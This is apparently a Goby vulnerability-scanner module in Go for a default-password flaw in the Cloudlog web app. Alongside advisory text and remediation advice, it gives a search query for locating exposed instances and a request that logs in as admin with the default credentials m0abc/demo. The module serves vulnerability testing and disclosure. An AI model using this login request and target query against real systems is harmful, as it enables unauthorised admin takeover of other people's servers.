package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Cloudlog /index.php/user/login Default Password Vulnerability",
    "Description": "<p>Cloudlog is a self-hosted PHP application that allows you to log your amateur radio contacts anywhere. All you need is a web browser and active internet connection.</p><p>Cloudlog has a default admin account: m0abc/demo. Attackers can exploit this default password vulnerability to take control of the entire platform and perform core functions with administrator privileges.</p>",
    "Product": "Cloudlog",
    "Homepage": "https://github.com/magicbug/Cloudlog/",
    "DisclosureDate": "2025-02-06",
    "PostTime": "2025-02-06",
    "Author": "455197090@qq.com",
    "FofaQuery": "title=\"Login - Cloudlog\" && body=\"/assets/images/dot.png\"",
    "GobyQuery": "title=\"Login - Cloudlog\" && body=\"/assets/images/dot.png\"",
    "Level": "2",
    "Impact": "<p>Cloudlog has a default admin account: m0abc/demo. Attackers can exploit this default password vulnerability to take control of the entire platform and perform core functions with administrator privileges.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.  </p><p>2. If not necessary, prohibit public network access to the system.  </p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/magicbug/Cloudlog/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attack",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/user/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                },
                "data_type": "text",
                "data": "id=&user_name=m0abc&user_password=demo"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "303",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "index.php/dashboard",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|define|variable|{{{fixedhostinfo}}}/index.php/user/login:m0abc@demo"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/user/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                },
                "data_type": "text",
                "data": "id=&user_name=m0abc&user_password=demo"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "303",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "index.php/dashboard",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|You can access {{{fixedhostinfo}}}, enter username:\"m0abc\" and password:\"demo\", and then click \"Login\" to enter."
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Cloudlog /index.php/user/login 默认口令漏洞",
            "Product": "Cloudlog",
            "Description": "<p>Cloudlog是一个自托管的PHP应用程序，允许您在任何地方记录业余无线电联系人。你所需要的只是一个网络浏览器和活跃的互联网连接。</p><p>Cloudlog存在默认管理账户m0abc/demo。攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。&nbsp;&nbsp;</p><p>2、如非必要，禁止公网访问该系统。&nbsp;</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>Cloudlog存在默认管理账户m0abc/demo。攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Cloudlog /index.php/user/login Default Password Vulnerability",
            "Product": "Cloudlog",
            "Description": "<p>Cloudlog is a self-hosted PHP application that allows you to log your amateur radio contacts anywhere. All you need is a web browser and active internet connection.<br></p><p>Cloudlog has a default admin account: m0abc/demo. Attackers can exploit this default password vulnerability to take control of the entire platform and perform core functions with administrator privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.&nbsp;&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.&nbsp;&nbsp;</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>Cloudlog has a default admin account: m0abc/demo. Attackers can exploit this default password vulnerability to take control of the entire platform and perform core functions with administrator privileges.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9984"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}